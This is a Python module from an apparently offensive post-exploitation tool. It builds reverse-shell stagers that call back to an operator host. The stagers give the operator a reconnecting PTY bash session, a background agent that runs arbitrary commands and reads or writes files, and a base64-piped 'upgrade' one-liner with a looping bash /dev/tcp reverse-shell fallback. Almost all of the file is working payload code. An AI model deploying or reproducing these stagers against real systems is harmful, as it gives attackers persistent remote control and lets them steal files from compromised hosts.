"""Stager payloads recce injects/generates. A stager is a *script* (no compiled implant,
no toolchain) that turns a connection into a robust, reconnecting PTY session.

One builder, `_stager()`, is the single source of truth — the server injects it for the
auto-pivot, and the browser fetches its template for the payload catalog, so the payload
never drifts between the two. It gives a real PTY (full interactivity, no stabilize dance),
announces a token (NAT-safe re-adoption), auto-reconnects on drop, honours a live resize
control (`\\x1bW<rows>,<cols>\\n`) so vim/nano/less work, and optionally runs over TLS.

`upgrade_command()` is the auto-pivot: a one-liner pushed into a *raw* caught shell that
detects an available interpreter (pwncat-style — python3/python/python2) and re-execs the
stager, so a weak shell upgrades itself into a robust one with no operator babysitting.
"""
from __future__ import annotations

import base64

# recce → stager out-of-band control: ESC W <rows>,<cols> \n — resize the target PTY.
# ESC-W isn't a key a terminal emits, so it won't collide with real keystrokes.
RESIZE_PREFIX = b"\x1bW"


def _stager(lhost: str, port: str, token: str, tls: bool) -> str:
    """The reconnecting-PTY stager body for `python -c '<this>'`. Args are substituted
    verbatim, so passing "{LHOST}"/"{PORT}"/"{TOKEN}" yields a fill-in-the-blanks template."""
    imports = "import socket,os,pty,select,time,signal,fcntl,termios,struct" + (",ssl" if tls else "")
    connect = ("raw=socket.socket();raw.connect((H,P));"
               "s=ssl._create_unverified_context().wrap_socket(raw,server_hostname=H)"
               if tls else "s=socket.socket();s.connect((H,P))")
    pend = " or s.pending()" if tls else ""
    return (
        f"{imports}\n"
        f'T="{token}";H="{lhost}";P={port}\n'
        "def sz(fd,a,b):\n"
        " try:fcntl.ioctl(fd,termios.TIOCSWINSZ,struct.pack('HHHH',a,b,0,0))\n"
        " except:pass\n"
        "while 1:\n"
        " s=None;pid=0\n"
        " try:\n"
        f"  {connect}\n"
        '  s.send(b"RECCE1 "+T.encode()+b" pty\\n")\n'
        "  pid,fd=pty.fork()\n"
        '  if pid==0:os.execv("/bin/sh",["/bin/sh","-c","exec bash -i 2>/dev/null||exec sh -i"])\n'
        "  sz(fd,40,120)\n"
        "  while 1:\n"
        f"   r=select.select([s,fd],[],[],1)[0]\n"
        f"   if s in r{pend}:\n"
        "    d=s.recv(4096)\n"
        "    if not d:break\n"
        '    if d[:2]==b"\\x1bW":\n'
        '     try:a,b=d[2:d.index(b"\\n")].split(b",");sz(fd,int(a),int(b))\n'
        "     except:pass\n"
        "    else:os.write(fd,d)\n"
        "   if fd in r:\n"
        "    d=os.read(fd,1024)\n"
        "    if not d:break\n"
        "    s.send(d)\n"
        " except Exception:pass\n"
        " try:\n"
        "  if pid>0:os.kill(pid,signal.SIGKILL)\n"
        " except:pass\n"
        " try:\n"
        "  if s:s.close()\n"
        " except:pass\n"
        " time.sleep(5)"
    )


def _oob_agent_body(lhost: str, port: str, token: str, tls: bool) -> str:
    """Compact OOB agent body for the stager v2. Runs in a background
    thread alongside the PTY loop. Speaks the framed protocol from
    `recce/sessions/oob.py`. See that module's AGENT_SCRIPT for the
    canonical (uncompressed) reference; this is a squashed inline
    version for the one-liner stager."""
    imports = "import socket,struct,subprocess,threading,time,os" + (",ssl" if tls else "")
    connect = (
        "raw=socket.socket();raw.connect((H,P));"
        "s=ssl._create_unverified_context().wrap_socket(raw,server_hostname=H)"
        if tls else "s=socket.socket();s.connect((H,P))"
    )
    # Types: EXEC=1, EXEC_RESULT=2, FILE_WRITE=3, FILE_ACK=4,
    # FILE_READ=5, FILE_DATA=6, PING=7, PONG=8
    return (
        f"{imports}\n"
        f'T="{token}";H="{lhost}";P={port}\n'
        "lk=threading.Lock()\n"
        "def rx(s,n):\n"
        " b=b\"\"\n"
        " while len(b)<n:\n"
        "  c=s.recv(n-len(b))\n"
        "  if not c:return None\n"
        "  b+=c\n"
        " return b\n"
        "def sf(s,t,p=b\"\"):\n"
        " with lk:\n"
        "  try:s.sendall(struct.pack('!IB',len(p),t)+p)\n"
        "  except:pass\n"
        "def he(s,p):\n"
        " try:\n"
        "  r=subprocess.run(['bash','-c',p.decode('utf-8','replace')],capture_output=True,timeout=180)\n"
        "  sf(s,2,struct.pack('!I',r.returncode&0xffffffff)+r.stdout+r.stderr)\n"
        " except Exception as e:sf(s,2,struct.pack('!I',127)+str(e).encode('utf-8','replace')[:200])\n"
        "def hw(s,p):\n"
        " pl=struct.unpack('!I',p[:4])[0]\n"
        " pt=p[4:4+pl].decode('utf-8','replace');d=p[4+pl:]\n"
        " try:\n"
        "  dd=os.path.dirname(pt)\n"
        "  if dd:os.makedirs(dd,exist_ok=True)\n"
        "  f=open(pt,'wb');f.write(d);f.close();sf(s,4,struct.pack('!I',len(d)))\n"
        " except Exception as e:sf(s,4,b'\\xff'+str(e).encode('utf-8','replace')[:200])\n"
        "def hr(s,p):\n"
        " pl=struct.unpack('!I',p[:4])[0]\n"
        " pt=p[4:4+pl].decode('utf-8','replace')\n"
        " try:\n"
        "  f=open(pt,'rb');d=f.read();f.close();sf(s,6,d)\n"
        " except:sf(s,6,b'')\n"
        "def oob_loop():\n"
        " while 1:\n"
        "  s=None\n"
        "  try:\n"
        f"   {connect}\n"
        "   s.sendall(b'RECCE1 '+T.encode()+b' oob\\n')\n"
        "   while 1:\n"
        "    h=rx(s,5)\n"
        "    if h is None:break\n"
        "    L=struct.unpack('!I',h[:4])[0];t=h[4]\n"
        "    p=rx(s,L) if L else b''\n"
        "    if p is None:break\n"
        "    if t==1:threading.Thread(target=he,args=(s,p),daemon=True).start()\n"
        "    elif t==3:threading.Thread(target=hw,args=(s,p),daemon=True).start()\n"
        "    elif t==5:threading.Thread(target=hr,args=(s,p),daemon=True).start()\n"
        "    elif t==7:sf(s,8,p)\n"
        "  except Exception:pass\n"
        "  try:\n"
        "   if s:s.close()\n"
        "  except:pass\n"
        "  time.sleep(2)\n"
        "threading.Thread(target=oob_loop,daemon=True).start()"
    )


def _stager_v2(lhost: str, port: str, token: str, tls: bool) -> str:
    """PTY stager + OOB agent side-by-side. The PTY loop is unchanged
    (100% back-compat with the existing listener path); the OOB agent
    starts in a background thread that opens a SEPARATE TCP connection
    with a `RECCE1 <token> oob\\n` handshake. The listener recognises
    that keyword and binds the connection to this session's
    `oob_channel`, so quickrun / download / upload / enum use the
    clean channel instead of shell-echoing base64 through the PTY."""
    return _oob_agent_body(lhost, port, token, tls) + "\n" + _stager(lhost, port, token, tls)


def python_stager(lhost: str, port: int, token: str) -> str:
    return _stager(lhost, str(port), token, tls=False)


def stager_template(tls: bool, oob: bool = True) -> str:
    """A `python3 -c '...'` one-liner with {LHOST}/{PORT}/{TOKEN} placeholders — the browser
    fetches this and fills it client-side, so there's one source of truth for the payload.
    `oob=True` includes the dedicated OOB agent alongside the PTY loop so quickrun/
    download/upload/enum don't share the PTY channel."""
    body = (_stager_v2 if oob else _stager)("{LHOST}", "{PORT}", "{TOKEN}", tls)
    return "python3 -c '" + body + "'"


def upgrade_command(lhost: str, port: int, token: str, tls: bool = False,
                     oob: bool = True) -> str:
    """A single line to inject into a RAW shell, pwncat-style method detection:
      1. python (python3/python/python2) → full reconnecting-PTY stager (best)
      2. bash /dev/tcp → a reconnecting shell with the token but no PTY (very common fallback)
      3. neither → RECCE_NO_METHOD
    Each backgrounds a self-healing loop, so the weak shell upgrades itself in place.
    `oob=True` (default) uses the v2 stager that also runs the OOB agent so
    control commands go over a separate channel."""
    body = (_stager_v2 if oob else _stager)(lhost, str(port), token, tls)
    b64 = base64.b64encode(body.encode()).decode()
    # bash fallback: reconnecting (non-PTY) shell, announces the token WITHOUT the pty flag
    bash_fb = (
        "bash -c '(while :; do exec 3<>/dev/tcp/" + lhost + "/" + str(port) + " 2>/dev/null && "
        'printf "RECCE1 ' + token + '\\n" >&3 && bash -i <&3 >&3 2>&3; '
        "exec 3<&- 3>&- 2>/dev/null; sleep 5; done) &' 2>/dev/null"
    )
    return (
        'PY=$(command -v python3||command -v python||command -v python2); '
        f'if [ -n "$PY" ]; then (echo {b64} | base64 -d | "$PY" - >/dev/null 2>&1 &); echo RECCE_UPGRADE_SENT; '
        f'elif command -v bash >/dev/null 2>&1; then {bash_fb}; echo RECCE_UPGRADE_SENT; '
        'else echo RECCE_NO_METHOD; fi'
    )
